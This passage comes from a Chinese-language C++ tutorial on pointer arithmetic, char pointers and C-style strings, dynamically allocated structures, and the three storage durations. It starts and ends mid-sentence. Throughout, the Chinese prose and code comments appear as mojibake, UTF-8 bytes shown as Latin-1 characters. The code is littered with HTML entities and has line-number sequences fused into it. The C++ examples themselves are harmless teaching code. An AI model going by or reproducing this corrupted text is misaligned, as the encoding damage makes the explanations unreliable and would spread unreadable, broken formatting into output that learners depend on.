ä¸­æœ‰ç€éå¸¸ç´§å¯†çš„è”ç³»ã€‚ç†è§£è¿™ç§å…³ç³»ä»¥åŠæŒ‡é’ˆç®—æœ¯å¯¹äºæœ‰æ•ˆåœ°ä½¿ç”¨ C++ å¤„ç†å†…å­˜å’Œæ•°æ®é›†åˆè‡³å…³é‡è¦ã€‚ 4.8.1 ç¨‹åºè¯´æ˜æŒ‡é’ˆç®—æœ¯å…è®¸æˆ‘ä»¬å¯¹æŒ‡é’ˆæ‰§è¡Œä¸€äº›ç‰¹æ®Šçš„ç®—æœ¯è¿ç®—ï¼Œä¸»è¦æ˜¯åŠ æ³•å’Œå‡æ³•ï¼Œä»¥ä¾¿åœ¨å†…å­˜ä¸­ç§»åŠ¨ï¼Œç‰¹åˆ«æ˜¯åœ¨æ•°ç»„ä¸­ã€‚ æŒ‡é’ˆä¸æ•°ç»„åçš„å…³ç³»: åœ¨ C++ ä¸­ï¼Œæ•°ç»„ååœ¨å¾ˆå¤šæƒ…å†µä¸‹ä¼šè¢«éšå¼åœ°å½“ä½œæŒ‡å‘å…¶ç¬¬ä¸€ä¸ªå…ƒç´ çš„æŒ‡é’ˆã€‚ 123456789101112131415161718192021222324252627282930313233343536#include &lt;iostream&gt;int main() &#123; double wages[3] = &#123;1000.0, 2000.0, 3000.0&#125;; double *p_wages = wages; // æ•°ç»„å wages è¢«å½“ä½œæŒ‡å‘ç¬¬ä¸€ä¸ªå…ƒç´ çš„æŒ‡é’ˆ (&amp;wages[0]) std::cout &lt;&lt; &quot;Address of first element (&amp;wages[0]): &quot; &lt;&lt; &amp;wages[0] &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Value of array name (wages): &quot; &lt;&lt; wages &lt;&lt; std::endl; // è¾“å‡ºä¸ &amp;wages[0] ç›¸åŒ std::cout &lt;&lt; &quot;Value of pointer (p_wages): &quot; &lt;&lt; p_wages &lt;&lt; std::endl; // è¾“å‡ºä¸ &amp;wages[0] ç›¸åŒ // é€šè¿‡æŒ‡é’ˆè®¿é—®æ•°ç»„å…ƒç´  std::cout &lt;&lt; &quot;First element via pointer (*p_wages): &quot; &lt;&lt; *p_wages &lt;&lt; std::endl; // è¾“å‡º 1000.0 // æŒ‡é’ˆç®—æœ¯: å°†æŒ‡é’ˆç§»åŠ¨åˆ°ä¸‹ä¸€ä¸ªå…ƒç´  p_wages = p_wages + 1; // æŒ‡é’ˆåŠ  1 std::cout &lt;&lt; &quot;Address after p_wages + 1: &quot; &lt;&lt; p_wages &lt;&lt; std::endl; // æŒ‡å‘ wages[1] çš„åœ°å€ std::cout &lt;&lt; &quot;Value at *(p_wages + 1) (now *p_wages): &quot; &lt;&lt; *p_wages &lt;&lt; std::endl; // è¾“å‡º 2000.0 // ä½¿ç”¨æ•°ç»„ä¸‹æ ‡è®¿é—® (å³ä½¿æ˜¯é€šè¿‡æŒ‡é’ˆ) p_wages = wages; // é‡ç½®æŒ‡é’ˆæŒ‡å‘ç¬¬ä¸€ä¸ªå…ƒç´  std::cout &lt;&lt; &quot;Accessing via pointer subscript p_wages[1]: &quot; &lt;&lt; p_wages[1] &lt;&lt; std::endl; // è¾“å‡º 2000.0 std::cout &lt;&lt; &quot;Accessing via array name subscript wages[1]: &quot; &lt;&lt; wages[1] &lt;&lt; std::endl; // è¾“å‡º 2000.0 // æ•°ç»„åå’ŒæŒ‡é’ˆçš„åŒºåˆ«: // 1. sizeof: sizeof(wages) æ˜¯æ•´ä¸ªæ•°ç»„çš„å¤§å° (3 * sizeof(double)) // sizeof(p_wages) æ˜¯æŒ‡é’ˆæœ¬èº«çš„å¤§å° (é€šå¸¸ 4 æˆ– 8 å­—èŠ‚) // 2. åœ°å€: &amp;wages æ˜¯æ•´ä¸ªæ•°ç»„çš„åœ°å€ (ç±»å‹æ˜¯ double(*)[3]) // &amp;p_wages æ˜¯æŒ‡é’ˆå˜é‡ p_wages è‡ªèº«çš„åœ°å€ // 3. ä¿®æ”¹: æ•°ç»„å wages æ˜¯å¸¸é‡ï¼Œä¸èƒ½ä¿®æ”¹ (ä¸èƒ½ wages = wages + 1;) // æŒ‡é’ˆ p_wages æ˜¯å˜é‡ï¼Œå¯ä»¥ä¿®æ”¹æŒ‡å‘å…¶ä»–åœ°å€ (p_wages = p_wages + 1;) std::cout &lt;&lt; &quot;sizeof(wages): &quot; &lt;&lt; sizeof(wages) &lt;&lt; std::endl; std::cout &lt;&lt; &quot;sizeof(p_wages): &quot; &lt;&lt; sizeof(p_wages) &lt;&lt; std::endl; return 0;&#125; æŒ‡é’ˆç®—æœ¯è§„åˆ™: æŒ‡é’ˆåŠ æ•´æ•° p + n: ç»“æœæ˜¯ä¸€ä¸ªæŒ‡å‘ p åŸæ¥æŒ‡å‘ä½ç½®ä¹‹åç¬¬ n ä¸ªå…ƒç´ çš„åœ°å€ã€‚ç¼–è¯‘å™¨ä¼šæ ¹æ®æŒ‡é’ˆæŒ‡å‘çš„ç±»å‹å¤§å°è‡ªåŠ¨è®¡ç®—å®é™…åœ°å€åç§»é‡ï¼ˆåœ°å€ = pçš„åœ°å€ + n * sizeof(æŒ‡å‘çš„ç±»å‹)ï¼‰ã€‚ æŒ‡é’ˆå‡æ•´æ•° p - n: ç»“æœæ˜¯ä¸€ä¸ªæŒ‡å‘ p åŸæ¥æŒ‡å‘ä½ç½®ä¹‹å‰ç¬¬ n ä¸ªå…ƒç´ çš„åœ°å€ã€‚ æŒ‡é’ˆå‡æŒ‡é’ˆ p1 - p2: ç»“æœæ˜¯ä¸¤ä¸ªæŒ‡é’ˆä¹‹é—´ç›¸éš”çš„å…ƒç´ æ•°é‡ï¼ˆä¸€ä¸ªæ•´æ•°ï¼‰ã€‚åªæœ‰å½“ä¸¤ä¸ªæŒ‡é’ˆæŒ‡å‘åŒä¸€ä¸ªæ•°ç»„ï¼ˆæˆ–è¶…å‡ºæœ«å°¾ä¸€ä¸ªä½ç½®ï¼‰ä¸­çš„å…ƒç´ æ—¶ï¼Œè¿™ä¸ªæ“ä½œæ‰æœ‰æ„ä¹‰ã€‚ç»“æœçš„ç±»å‹æ˜¯ std::ptrdiff_t (åœ¨ &lt;cstddef&gt; ä¸­å®šä¹‰)ã€‚ é€’å¢/é€’å‡: ++p, p++, --p, p-- åˆ†åˆ«ä½¿æŒ‡é’ˆæŒ‡å‘ä¸‹ä¸€ä¸ªæˆ–ä¸Šä¸€ä¸ªå…ƒç´ ã€‚ æ¯”è¾ƒ: å¯ä»¥ä½¿ç”¨å…³ç³»è¿ç®—ç¬¦ (&lt;, &gt;, &lt;=, &gt;=) æ¯”è¾ƒæŒ‡å‘åŒä¸€ä¸ªæ•°ç»„å…ƒç´ çš„æŒ‡é’ˆï¼Œåˆ¤æ–­å®ƒä»¬çš„ç›¸å¯¹ä½ç½®ã€‚ä¹Ÿå¯ä»¥ä½¿ç”¨ == å’Œ != æ¯”è¾ƒæŒ‡é’ˆæ˜¯å¦æŒ‡å‘åŒä¸€ä¸ªåœ°å€ï¼ˆæˆ–æ˜¯å¦éƒ½ä¸ºç©ºï¼‰ã€‚ æ•°ç»„ä¸‹æ ‡å’ŒæŒ‡é’ˆçš„å…³ç³»: è¡¨è¾¾å¼ arrayName[i] åœ¨ C++ ä¸­ç­‰ä»·äº *(arrayName + i)ã€‚åŒæ ·ï¼Œå¦‚æœ p æ˜¯ä¸€ä¸ªæŒ‡å‘æ•°ç»„å…ƒç´ çš„æŒ‡é’ˆï¼Œp[i] ç­‰ä»·äº *(p + i)ã€‚ è¿™æ„å‘³ç€ä½ å¯ä»¥å¯¹æ•°ç»„åä½¿ç”¨æŒ‡é’ˆç®—æœ¯ï¼ˆæ¦‚å¿µä¸Šï¼‰ï¼Œä¹Ÿå¯ä»¥å¯¹æŒ‡é’ˆä½¿ç”¨æ•°ç»„ä¸‹æ ‡è¡¨ç¤ºæ³•ã€‚ 4.8.2 æŒ‡é’ˆå°ç»“è®©æˆ‘ä»¬å›é¡¾ä¸€ä¸‹å…³äºæŒ‡é’ˆçš„å…³é”®æ¦‚å¿µï¼š å£°æ˜: ä½¿ç”¨ typeName * pointerName; å£°æ˜ä¸€ä¸ªæŒ‡å‘ typeName ç±»å‹æ•°æ®çš„æŒ‡é’ˆã€‚ åˆå§‹åŒ–: ä½¿ç”¨ &amp; è·å–å˜é‡åœ°å€: pointerName = &amp;variableName; åˆå§‹åŒ–ä¸ºç©ºæŒ‡é’ˆ: pointerName = nullptr; (C++11) æˆ– pointerName = 0; ä½¿ç”¨ new åˆ†é…åŠ¨æ€å†…å­˜: pointerName = new typeName; æˆ– pointerName = new typeName[size]; è§£å¼•ç”¨: ä½¿ç”¨ * è®¿é—®æŒ‡é’ˆæŒ‡å‘çš„å€¼: value = *pointerName; æˆ– *pointerName = newValue;ã€‚ æŒ‡é’ˆä¸æ•°ç»„: æ•°ç»„åé€šå¸¸å¯è§†ä¸ºæŒ‡å‘ç¬¬ä¸€ä¸ªå…ƒç´ çš„å¸¸é‡æŒ‡é’ˆã€‚æŒ‡é’ˆç®—æœ¯å…è®¸åœ¨æ•°ç»„å…ƒç´ é—´ç§»åŠ¨ã€‚array[i] ç­‰ä»·äº *(array + i)ã€‚ åŠ¨æ€å†…å­˜: ä½¿ç”¨ new åˆ†é…ï¼Œå¿…é¡»ä½¿ç”¨ delete (å¯¹åº” new) æˆ– delete[] (å¯¹åº” new[]) é‡Šæ”¾ã€‚ å±é™©: æœªåˆå§‹åŒ–æŒ‡é’ˆã€ç©ºæŒ‡é’ˆè§£å¼•ç”¨ã€æ‚¬æŒ‚æŒ‡é’ˆã€å†…å­˜æ³„æ¼ã€é”™è¯¯çš„ delete/delete[] ä½¿ç”¨ã€‚ æŒ‡é’ˆæœ¬èº« vs æŒ‡å‘çš„å€¼: pointerName å­˜å‚¨çš„æ˜¯åœ°å€ï¼Œ*pointerName æ˜¯è¯¥åœ°å€å¤„çš„å€¼ã€‚ 4.8.3 æŒ‡é’ˆå’Œå­—ç¬¦ä¸²C é£æ ¼å­—ç¬¦ä¸²æœ¬è´¨ä¸Šæ˜¯ char ç±»å‹çš„æ•°ç»„ï¼Œä»¥ç©ºå­—ç¬¦ \\0 ç»“å°¾ã€‚å› æ­¤ï¼ŒæŒ‡é’ˆåœ¨å¤„ç† C é£æ ¼å­—ç¬¦ä¸²æ—¶éå¸¸å¸¸ç”¨ã€‚ å­—ç¬¦ä¸²å­—é¢å€¼: å­—ç¬¦ä¸²å­—é¢å€¼ï¼ˆå¦‚ &quot;Hello&quot;) åœ¨å†…å­˜ä¸­å­˜å‚¨ä¸º const char æ•°ç»„ï¼Œå¹¶ä»¥ \\0 ç»“å°¾ã€‚å­—ç¬¦ä¸²å­—é¢å€¼æœ¬èº«å¯ä»¥è¢«å½“ä½œæŒ‡å‘å…¶ç¬¬ä¸€ä¸ªå­—ç¬¦çš„ const char* æŒ‡é’ˆã€‚ char æŒ‡é’ˆ: å¯ä»¥å£°æ˜ char* æˆ– const char* æŒ‡é’ˆæ¥æŒ‡å‘ C é£æ ¼å­—ç¬¦ä¸²ã€‚ ç”¨æ³•ä¸ç¤ºä¾‹: 1234567891011121314151617181920212223242526272829303132333435363738394041#include &lt;iostream&gt;#include &lt;cstring&gt; // ä¸ºäº† strlen()int main() &#123; char animal[20] = &quot;bear&quot;; // animal æ˜¯ char æ•°ç»„ const char *bird = &quot;wren&quot;; // bird æ˜¯æŒ‡å‘ &quot;wren&quot; å­—ç¬¦ä¸²å­—é¢å€¼ç¬¬ä¸€ä¸ªå­—ç¬¦ &#x27;w&#x27; çš„æŒ‡é’ˆ char *p_animal; // æœªåˆå§‹åŒ–çš„ char æŒ‡é’ˆ std::cout &lt;&lt; animal &lt;&lt; &quot; and &quot; &lt;&lt; bird &lt;&lt; std::endl; // cout çŸ¥é“å¦‚ä½•å¤„ç† char* (æ‰“å°ç›´åˆ° \\0) // æŒ‡é’ˆæŒ‡å‘æ•°ç»„ p_animal = animal; // p_animal æŒ‡å‘ animal æ•°ç»„çš„ç¬¬ä¸€ä¸ªå­—ç¬¦ &#x27;b&#x27; std::cout &lt;&lt; &quot;Pointer p_animal points to: &quot; &lt;&lt; p_animal &lt;&lt; std::endl; // è¾“å‡º &quot;bear&quot; // è®¿é—®å­—ç¬¦ä¸²å†…å®¹ std::cout &lt;&lt; &quot;First char via array: &quot; &lt;&lt; animal[0] &lt;&lt; std::endl; // b std::cout &lt;&lt; &quot;First char via pointer: &quot; &lt;&lt; *p_animal &lt;&lt; std::endl; // b // æŒ‡é’ˆç®—æœ¯éå†å­—ç¬¦ä¸² std::cout &lt;&lt; &quot;Using pointer arithmetic:&quot; &lt;&lt; std::endl; const char *p_bird = bird; while (*p_bird != &#x27;\\0&#x27;) &#123; // å¾ªç¯ç›´åˆ°é‡åˆ°ç©ºå­—ç¬¦ std::cout &lt;&lt; *p_bird &lt;&lt; &quot; &quot;; p_bird++; // æŒ‡é’ˆç§»åŠ¨åˆ°ä¸‹ä¸€ä¸ªå­—ç¬¦ &#125; std::cout &lt;&lt; std::endl; // å­—ç¬¦ä¸²å­—é¢å€¼å’ŒæŒ‡é’ˆ const char *p_literal = &quot;This is a literal&quot;; std::cout &lt;&lt; p_literal &lt;&lt; std::endl; // p_literal[0] = &#x27;t&#x27;; // é”™è¯¯! å­—ç¬¦ä¸²å­—é¢å€¼é€šå¸¸æ˜¯åªè¯»çš„ (const char*) // åŠ¨æ€åˆ†é…å­—ç¬¦ä¸² char *p_dynamic_str = new char[strlen(&quot;Dynamic String&quot;) + 1]; // +1 ä¸ºäº†ç©ºå­—ç¬¦ strcpy(p_dynamic_str, &quot;Dynamic String&quot;); // ä½¿ç”¨ strcpy å¤åˆ¶ (ä¸å®‰å…¨ï¼Œæœ€å¥½ç”¨ strncpy æˆ– C++ string) std::cout &lt;&lt; &quot;Dynamic string: &quot; &lt;&lt; p_dynamic_str &lt;&lt; std::endl; delete [] p_dynamic_str; // é‡Šæ”¾åŠ¨æ€åˆ†é…çš„æ•°ç»„ p_dynamic_str = nullptr; return 0;&#125; æ³¨æ„: cout å¯¹ char* æœ‰ç‰¹æ®Šå¤„ç†ï¼Œå®ƒä¼šæ‰“å°ä»æŒ‡é’ˆæŒ‡å‘åœ°å€å¼€å§‹ç›´åˆ°é‡åˆ°ç©ºå­—ç¬¦ \\0 çš„æ‰€æœ‰å­—ç¬¦ã€‚ ä¿®æ”¹å­—ç¬¦ä¸²å­—é¢å€¼æ˜¯æœªå®šä¹‰è¡Œä¸ºï¼Œåº”ä½¿ç”¨ const char* æŒ‡å‘å®ƒä»¬ã€‚ å¤„ç† C é£æ ¼å­—ç¬¦ä¸²æ—¶è¦ç‰¹åˆ«æ³¨æ„ç¼“å†²åŒºæº¢å‡ºé—®é¢˜ï¼ˆä¾‹å¦‚ä½¿ç”¨ strcpy æ—¶ç›®æ ‡æ•°ç»„ä¸å¤Ÿå¤§ï¼‰ï¼Œå¹¶ç¡®ä¿å­—ç¬¦ä¸²ä»¥ \\0 ç»“å°¾ã€‚std::string ç±»é€šå¸¸æ˜¯æ›´å®‰å…¨ã€æ›´æ–¹ä¾¿çš„é€‰æ‹©ã€‚ 4.8.4 ä½¿ç”¨newåˆ›å»ºåŠ¨æ€ç»“æ„å°±åƒå¯ä»¥åŠ¨æ€åˆ†é…åŸºæœ¬ç±»å‹å’Œæ•°ç»„ä¸€æ ·ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ new åŠ¨æ€åˆ›å»ºç»“æ„ä½“ï¼ˆæˆ–ç±»ï¼‰å¯¹è±¡ã€‚ åˆ†é…: 1StructureName * pointerVariable = new StructureName; è¿™ä¼šåœ¨è‡ªç”±å­˜å‚¨åŒºåˆ†é…è¶³å¤Ÿå­˜å‚¨ StructureName ç»“æ„æ‰€æœ‰æˆå‘˜çš„å†…å­˜ï¼Œå¹¶è°ƒç”¨è¯¥ç»“æ„çš„æ„é€ å‡½æ•°ï¼ˆå¦‚æœæ˜¯ç±»æˆ–æœ‰æ„é€ å‡½æ•°çš„ç»“æ„ï¼‰ï¼Œç„¶åè¿”å›æŒ‡å‘æ–°åˆ›å»ºç»“æ„çš„æŒ‡é’ˆã€‚ è®¿é—®æˆå‘˜: å½“é€šè¿‡æŒ‡é’ˆè®¿é—®ç»“æ„æˆ–ç±»çš„æˆå‘˜æ—¶ï¼Œä¸èƒ½ç›´æ¥ä½¿ç”¨ç‚¹è¿ç®—ç¬¦ .ã€‚æœ‰ä¸¤ç§æ–¹å¼ï¼š è§£å¼•ç”¨å†ç”¨ç‚¹ ((*ptr).member): å…ˆè§£å¼•ç”¨æŒ‡é’ˆ *ptr å¾—åˆ°ç»“æ„æœ¬èº«ï¼Œç„¶åä½¿ç”¨ç‚¹è¿ç®—ç¬¦è®¿é—®æˆå‘˜ã€‚æ‹¬å·æ˜¯å¿…éœ€çš„ï¼Œå› ä¸ºç‚¹è¿ç®—ç¬¦çš„ä¼˜å…ˆçº§é«˜äºè§£å¼•ç”¨è¿ç®—ç¬¦ã€‚ ç®­å¤´è¿ç®—ç¬¦ (ptr-&gt;member): è¿™æ˜¯æ›´å¸¸ç”¨ã€æ›´ç®€æ´çš„æ–¹å¼ã€‚ç®­å¤´è¿ç®—ç¬¦ -&gt; ä¸“é—¨ç”¨äºé€šè¿‡æŒ‡é’ˆè®¿é—®å…¶æŒ‡å‘çš„ç»“æ„æˆ–ç±»çš„æˆå‘˜ã€‚ptr-&gt;member å®Œå…¨ç­‰ä»·äº (*ptr).memberã€‚ é‡Šæ”¾: ä½¿ç”¨ delete é‡Šæ”¾ç”± new åˆ›å»ºçš„å•ä¸ªç»“æ„å¯¹è±¡ã€‚delete ä¼šå…ˆè°ƒç”¨è¯¥å¯¹è±¡çš„ææ„å‡½æ•°ï¼ˆå¦‚æœéœ€è¦ï¼‰ï¼Œç„¶åé‡Šæ”¾å†…å­˜ã€‚ 12delete pointerVariable;pointerVariable = nullptr; // å¥½ä¹ æƒ¯ ç”¨æ³•ä¸ç¤ºä¾‹: 1234567891011121314151617181920212223242526272829303132333435#include &lt;iostream&gt;#include &lt;string&gt;struct Inflatable &#123; std::string name; float volume; double price;&#125;;int main() &#123; // åŠ¨æ€åˆ›å»º Inflatable ç»“æ„ Inflatable *ps = new Inflatable; // åœ¨è‡ªç”±å­˜å‚¨åŒºåˆ›å»ºç»“æ„ // è®¿é—®æˆå‘˜ // æ–¹æ³• 1: è§£å¼•ç”¨å’Œç‚¹è¿ç®—ç¬¦ (*ps).name = &quot;Dynamic Floatie&quot;; (*ps).volume = 1.5f; // æ–¹æ³• 2: ç®­å¤´è¿ç®—ç¬¦ (æ›´å¸¸ç”¨) ps-&gt;price = 29.99; std::cout &lt;&lt; &quot;Dynamically created structure:&quot; &lt;&lt; std::endl; std::cout &lt;&lt; &quot; Name: &quot; &lt;&lt; ps-&gt;name &lt;&lt; std::endl; std::cout &lt;&lt; &quot; Volume: &quot; &lt;&lt; (*ps).volume &lt;&lt; std::endl; // ä¸¤ç§æ–¹å¼éƒ½å¯ä»¥ç”¨ std::cout &lt;&lt; &quot; Price: &quot; &lt;&lt; ps-&gt;price &lt;&lt; std::endl; std::cout &lt;&lt; &quot; Address: &quot; &lt;&lt; ps &lt;&lt; std::endl; // é‡Šæ”¾åŠ¨æ€åˆ›å»ºçš„ç»“æ„ delete ps; ps = nullptr; std::cout &lt;&lt; &quot;Structure deleted.&quot; &lt;&lt; std::endl; return 0;&#125; 4.8.5 è‡ªåŠ¨å­˜å‚¨ã€é™æ€å­˜å‚¨å’ŒåŠ¨æ€å­˜å‚¨C++ ç¨‹åºä¸­çš„å˜é‡å’Œæ•°æ®æ ¹æ®å…¶å†…å­˜åˆ†é…æ–¹å¼å’Œç”Ÿå‘½å‘¨æœŸï¼Œå¯ä»¥åˆ†ä¸ºä¸‰ç§ä¸»è¦çš„å­˜å‚¨ç±»åˆ«ï¼š è‡ªåŠ¨å­˜å‚¨æŒç»­æ€§ (Automatic Storage Duration): å†…å­˜åŒºåŸŸ: é€šå¸¸åœ¨ç§°ä¸ºæ ˆ (Stack) çš„å†…å­˜åŒºåŸŸåˆ†é…ã€‚ åˆ†é…/é‡Šæ”¾: å†…å­˜çš„åˆ†é…å’Œé‡Šæ”¾åœ¨å‡½æ•°ï¼ˆæˆ–ä»£ç å—ï¼‰è¿›å…¥å’Œé€€å‡ºæ—¶è‡ªåŠ¨è¿›è¡Œã€‚ ç”Ÿå‘½å‘¨æœŸ: å˜é‡åœ¨å£°æ˜å®ƒçš„å‡½æ•°æˆ–ä»£ç å—æ‰§è¡ŒæœŸé—´å­˜åœ¨ï¼Œå—ç»“æŸæ—¶è‡ªåŠ¨é”€æ¯ã€‚ ä¾‹å­: å‡½æ•°å†…éƒ¨å£°æ˜çš„é static å±€éƒ¨å˜é‡ï¼ˆåŒ…æ‹¬å‡½æ•°å‚æ•°ï¼‰ã€‚ ç‰¹ç‚¹: åˆ†é…å’Œé‡Šæ”¾é€Ÿåº¦å¿«ï¼Œç®¡ç†ç®€å•ï¼ˆè‡ªåŠ¨ï¼‰ï¼Œä½†ç©ºé—´æœ‰é™ï¼Œç”Ÿå‘½å‘¨æœŸå—é™äºä½œç”¨åŸŸã€‚ é™æ€å­˜å‚¨æŒç»­æ€§ (Static Storage Duration): å†…å­˜åŒºåŸŸ: åœ¨ç¨‹åºçš„æ•´ä¸ªç”Ÿå‘½å‘¨æœŸå†…éƒ½å­˜åœ¨äºå†…å­˜çš„æŸä¸ªå›ºå®šåŒºåŸŸï¼ˆé€šå¸¸æ˜¯é™æ€/å…¨å±€æ•°æ®åŒºï¼‰ã€‚ åˆ†é…/é‡Šæ”¾: å†…å­˜åœ¨ç¨‹åºå¯åŠ¨æ—¶åˆ†é…ï¼ˆæˆ–é¦–æ¬¡ä½¿ç”¨æ—¶ï¼Œå¯¹äºæŸäº›é™æ€å˜é‡ï¼‰ï¼Œåœ¨ç¨‹åºç»“æŸæ—¶é‡Šæ”¾ã€‚ ç”Ÿå‘½å‘¨æœŸ: ä»ç¨‹åºå¼€å§‹æ‰§è¡Œåˆ°ç¨‹åºç»“æŸã€‚ ä¾‹å­: åœ¨å‡½æ•°å¤–éƒ¨å£°æ˜çš„å˜é‡ï¼ˆå…¨å±€å˜é‡ï¼‰ã€ä½¿ç”¨ static å…³é”®å­—åœ¨å‡½æ•°å†…éƒ¨æˆ–ç±»å†…éƒ¨å£°æ˜çš„å˜é‡ã€‚ ç‰¹ç‚¹: ç”Ÿå‘½å‘¨æœŸé•¿ï¼Œå¯ä»¥è·¨å‡½æ•°è°ƒç”¨ä¿æŒå…¶å€¼ï¼Œä½†å…¨å±€å˜é‡å¯èƒ½å¯¼è‡´å‘½åå†²çªå’Œç®¡ç†å¤æ‚æ€§ã€‚ åŠ¨æ€å­˜å‚¨æŒç»­æ€§ (Dynamic Storage Duration): å†…å­˜åŒºåŸŸ: åœ¨ç§°ä¸ºè‡ªç”±å­˜å‚¨åŒº (Free Store) æˆ– å † (Heap) çš„å†…å­˜åŒºåŸŸåˆ†é…ã€‚ åˆ†é…/é‡Šæ”¾: å†…å­˜ç”±ç¨‹åºå‘˜ä½¿ç”¨ new (æˆ– malloc ç­‰ C å‡½æ•°) æ˜¾å¼åˆ†é…ï¼Œå¹¶ä¸”å¿…é¡»ä½¿ç”¨ delete (æˆ– free) æ˜¾å¼é‡Šæ”¾ã€‚ ç”Ÿå‘½å‘¨æœŸ: ä» new åˆ†é…æˆåŠŸå¼€å§‹ï¼Œç›´åˆ°ç¨‹åºå‘˜ä½¿ç”¨ delete é‡Šæ”¾ä¸ºæ­¢ã€‚ç”Ÿå‘½å‘¨æœŸä¸å‡½æ•°æˆ–ä»£ç å—çš„ä½œç”¨åŸŸæ— å…³ã€‚ ä¾‹å­: ä½¿ç”¨ new åˆ›å»ºçš„å˜é‡ã€æ•°ç»„æˆ–å¯¹è±¡ã€‚ ç‰¹ç‚¹: æä¾›äº†æœ€å¤§çš„çµæ´»æ€§ï¼Œå¯ä»¥åœ¨è¿è¡Œæ—¶æ ¹æ®éœ€è¦åˆ†é…ä»»æ„å¤§å°çš„å†…å­˜ï¼Œç”Ÿå‘½å‘¨æœŸç”±ç¨‹åºå‘˜æ§åˆ¶ã€‚ä½†ç®¡ç†å¤æ‚ï¼Œå®¹æ˜“å‡ºç°å†…å­˜æ³„æ¼ï¼ˆå¿˜è®° deleteï¼‰æˆ–æ‚¬æŒ‚æŒ‡é’ˆï¼ˆdelete åä»ä½¿ç”¨æŒ‡é’ˆï¼‰ç­‰é—®é¢˜ã€‚ ç¤ºä¾‹å¯¹æ¯”: 123456789101112131415161718192021222324252627282930313233343536373839#include &lt;iostream&gt;int global_static_var = 10; // é™æ€å­˜å‚¨ (å…¨å±€)static int file_static_var = 20; // é™æ€å­˜å‚¨ (æ–‡ä»¶ä½œç”¨åŸŸ)void func() &#123; int auto_var = 30; // è‡ªåŠ¨å­˜å‚¨ (æ ˆ) static int func_static_var = 40; // é™æ€å­˜å‚¨ (å‡½æ•°ä½œç”¨åŸŸï¼Œåªåˆå§‹åŒ–ä¸€æ¬¡) int *dynamic_var = new int(50); // åŠ¨æ€å­˜å‚¨ (å †) std::cout &lt;&lt; &quot; Inside func:&quot; &lt;&lt; std::endl; std::cout &lt;&lt; &quot; auto_var address: &quot; &lt;&lt; &amp;auto_var &lt;&lt; &quot; value: &quot; &lt;&lt; auto_var &lt;&lt; std::endl; std::cout &lt;&lt; &quot; func_static_var address: &quot; &lt;&lt; &amp;func_static_var &lt;&lt; &quot; value: &quot; &lt;&lt; ++func_static_var &lt;&lt; std::endl; std::cout &lt;&lt; &quot; dynamic_var address: &quot; &lt;&lt; dynamic_var &lt;&lt; &quot; value: &quot; &lt;&lt; *dynamic_var &lt;&lt; std::endl; delete dynamic_var; // å¿…é¡»æ‰‹åŠ¨é‡Šæ”¾åŠ¨æ€å†…å­˜ dynamic_var = nullptr;&#125; // auto_var åœ¨è¿™é‡Œé”€æ¯int main() &#123; std::cout &lt;&lt; &quot;Global static var address: &quot; &lt;&lt; &amp;global_static_var &lt;&lt; &quot; value: &quot; &lt;&lt; global_static_var &lt;&lt; std::endl; std::cout &lt;&lt; &quot;File static var address: &quot; &lt;&lt; &amp;file_static_var &lt;&lt; &quot; value: &quot; &lt;&lt; file_static_var &lt;&lt; std::endl; std::cout &lt;&lt; &quot;\\nCalling func first time:&quot; &lt;&lt; std::endl; func(); std::cout &lt;&lt; &quot;\\nCalling func second time:&quot; &lt;&lt; std::endl; func(); // æ³¨æ„ func_static_var çš„å€¼ä¼šä¿æŒ // int* dangling_ptr; // &#123; // int temp_auto = 100; // è‡ªåŠ¨å­˜å‚¨ // dangling_ptr = &amp;temp_auto; // &#125; // temp_auto é”€æ¯ // std::cout &lt;&lt; *dangling_ptr; // é”™è¯¯! æ‚¬æŒ‚æŒ‡é’ˆ return 0;&#125; ç†è§£è¿™ä¸‰ç§å­˜å‚¨æ–¹å¼å¯¹äºç¼–å†™å¥å£®ã€é«˜æ•ˆä¸”æ— å†…å­˜é”™è¯¯çš„ C++ ç¨‹åºè‡³å…³é‡è¦ã€‚ç°ä»£ C++ å€¾å‘äºä½¿ç”¨ RAII (Resource Acquisition Is Initialization) æŠ€æœ¯å’Œæ™ºèƒ½æŒ‡é’ˆï¼ˆå¦‚ std::unique_ptr, std::shared_ptrï¼‰æ¥è‡ªåŠ¨ç®¡ç†åŠ¨æ€å†…å­˜ï¼Œä»¥å‡å°‘æ‰‹åŠ¨ new/delete å¸¦æ¥çš„é£é™©ã€‚ 4.9 ç±»å‹ç»„åˆC++ çš„å¼ºå¤§ä¹‹å¤„åœ¨äºå…¶ç±»å‹ç³»ç»Ÿå…è®¸ä½ å°†åŸºæœ¬ç±»å‹ã€å¤åˆç±»å‹ï¼ˆæ•°ç»„ã€ç»“æ„ã€å…±ç”¨ä½“ã€æšä¸¾ï¼‰å’ŒæŒ‡é’ˆä»¥å¤šç§æ–¹å¼ç»„åˆèµ·æ¥ï¼Œåˆ›å»ºæ›´å¤æ‚çš„æ•°æ®ç»“æ„æ¥ç²¾ç¡®åœ°æ¨¡æ‹Ÿç°å®ä¸–ç•Œçš„é—®é¢˜ã€‚ æœ¬ç« æˆ‘ä»¬å·²ç»æ¥è§¦äº†ä¸€äº›ç»„åˆï¼š ç»“æ„æ•°ç»„ (Array of Structures): æ•°ç»„çš„æ¯ä¸ªå…ƒç´ éƒ½æ˜¯ä¸€ä¸ªç»“æ„ä½“ (è§ 4.4.5)ã€‚ ç»“æ„åŒ…å« std::string æˆå‘˜: ç»“æ„ä½“å¯ä»¥åŒ…å«ç±»ç±»å‹çš„æˆå‘˜ (è§ 4.4.3)ã€‚ æŒ‡é’ˆæŒ‡å‘ç»“æ„: å¯ä»¥å£°æ˜æŒ‡å‘ç»“æ„ä½“å¯¹è±¡çš„æŒ‡é’ˆ (è§ 4.8.4)ã€‚ æŒ‡é’ˆæŒ‡å‘æ•°ç»„ (æˆ–æ•°ç»„åè§†ä¸ºæŒ‡é’ˆ): æŒ‡é’ˆå¯ä»¥ç”¨æ¥æ“ä½œæ•°ç»„ (è§ 4.8.1)ã€‚ æœ¬èŠ‚å°†è¿›ä¸€æ­¥æ¢è®¨ä¸€äº›å¸¸è§çš„ç±»å‹ç»„åˆæ–¹å¼ã€‚ 1. ç»“æ„åŒ…å«æ•°ç»„æˆå‘˜: ç»“æ„ä½“å¯ä»¥åŒ…å«æ•°ç»„ä½œä¸ºå…¶æˆå‘˜ã€‚ 1234567891011121314151617181920212223242526272829#include &lt;iostream&gt;#include &lt;string&gt;struct StudentGrades &#123; std::string studentName; int grades[5]; // åŒ…å«ä¸€ä¸ª int æ•°ç»„ä½œä¸ºæˆå‘˜ int numGrades; // 